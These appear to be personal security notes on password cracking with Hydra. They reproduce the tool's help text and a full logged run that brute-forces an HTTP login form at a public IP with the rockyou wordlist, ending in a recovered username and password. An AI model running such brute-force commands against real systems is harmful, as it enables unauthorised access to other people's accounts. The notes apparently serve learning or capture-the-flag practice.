# Password Cracking

## Hydra

hydra [some command line options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]

### HELP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]

Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.

Example:  hydra -l user -P passlist.txt ftp://192.168.0.1


hydra [some command line options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]

### Real example of execution

kali@kali:/usr/share/wordlists$ hydra -L rockyou.txt -p password 3X.XXX.XXX.XX7 http-post-form "/51xxxxxf3/login:username=^USER^&password=^PASS^:Invalid username"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-16 13:31:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:14344399/p:1), ~896525 tries per task
[DATA] attacking http-post-form://34.74.105.127:80/516f8613f3/login:username=^USER^&password=^PASS^:Invalid username

[STATUS] 1450.00 tries/min, 1450 tries in 00:01h, 14342949 to do in 164:52h, 16 active
[STATUS] 1426.00 tries/min, 4278 tries in 00:03h, 14340121 to do in 167:37h, 16 active
[ERROR] Can not create restore file (./hydra.restore) - Permission denied
[STATUS] 1429.14 tries/min, 10004 tries in 00:07h, 14334395 to do in 167:11h, 16 active
[STATUS] 1435.93 tries/min, 21539 tries in 00:15h, 14322860 to do in 166:15h, 16 active
[STATUS] 1438.68 tries/min, 44599 tries in 00:31h, 14299800 to do in 165:40h, 16 active
[STATUS] 1436.09 tries/min, 67496 tries in 00:47h, 14276903 to do in 165:42h, 16 active
[STATUS] 1432.38 tries/min, 90240 tries in 01:03h, 14254159 to do in 165:52h, 16 active
[STATUS] 1437.46 tries/min, 113559 tries in 01:19h, 14230840 to do in 165:01h, 16 active
[STATUS] 1442.82 tries/min, 137068 tries in 01:35h, 14207331 to do in 164:07h, 16 active
[STATUS] 1447.39 tries/min, 160660 tries in 01:51h, 14183739 to do in 163:20h, 16 active
[STATUS] 1450.36 tries/min, 184196 tries in 02:07h, 14160203 to do in 162:44h, 16 active
[STATUS] 1451.15 tries/min, 207514 tries in 02:23h, 14136885 to do in 162:22h, 16 active
[80][http-post-form] host: 34.74.105.127   login: ianthe   password: password
